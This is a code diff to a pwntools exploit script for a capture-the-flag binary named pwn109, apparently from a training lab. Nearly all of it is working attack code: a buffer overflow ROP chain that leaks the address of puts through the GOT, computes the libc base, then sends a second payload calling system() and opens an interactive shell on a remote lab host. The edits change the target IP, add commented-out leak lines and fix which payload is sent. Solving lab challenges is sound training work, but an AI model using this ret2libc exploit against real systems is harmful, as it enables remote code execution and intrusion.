@@ -5,9 +5,9 @@ elf = context.binary = ELF('./pwn109.pwn109', checksec=False)
 
 #context.log_level = 'DEBUG'
 
-libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so')
+libc = ELF('libc6_2.27-3ubuntu1.4_amd64.so') # Can be found at libc.rip
 
-io = remote('10.10.27.139', 9009)
+io = remote('10.10.225.199', 9009)
 #io = process()
 
 # Offset found using cyclic pattern in gdb
@@ -19,7 +19,10 @@ pop_rdi = 0x4012a3
 payload = padding
 payload += p64(pop_rdi)
 payload += p64(elf.got.puts)  # Address of puts GOT entry
-payload += p64(elf.plt.puts)  # Call puts function
+payload += p64(elf.plt.puts)
+#payload += p64(pop_rdi)     
+#payload += p64(elf.got.gets)  #Address of gets entry
+#payload += p64(elf.plt.puts)
 payload += p64(elf.symbols.main)  # Return to main
 
 io.recvuntil("Go ahead")
@@ -30,6 +33,10 @@ io.sendline(payload)
 # Receive and parse the leaked address of puts
 got_puts_leak = u64(io.recvline().strip().ljust(8, b'\0'))
 info("puts leaked address: %#x", got_puts_leak)
+
+# Receive and parse the leaked address of gets
+#gets_puts_leak = u64(io.recvline().strip().ljust(8, b'\0'))
+#info("gets leaked address: %#x", gets_puts_leak)
 
 # Calculate the libc base address using the puts leak
 libc.address = got_puts_leak - libc.symbols.puts
@@ -50,5 +57,5 @@ payload2 += p64(ret_gadget)
 payload2 += p64(system)
 
 io.recvuntil("Go ahead")
-io.sendline(payload)
+io.sendline(payload2)
 io.interactive()
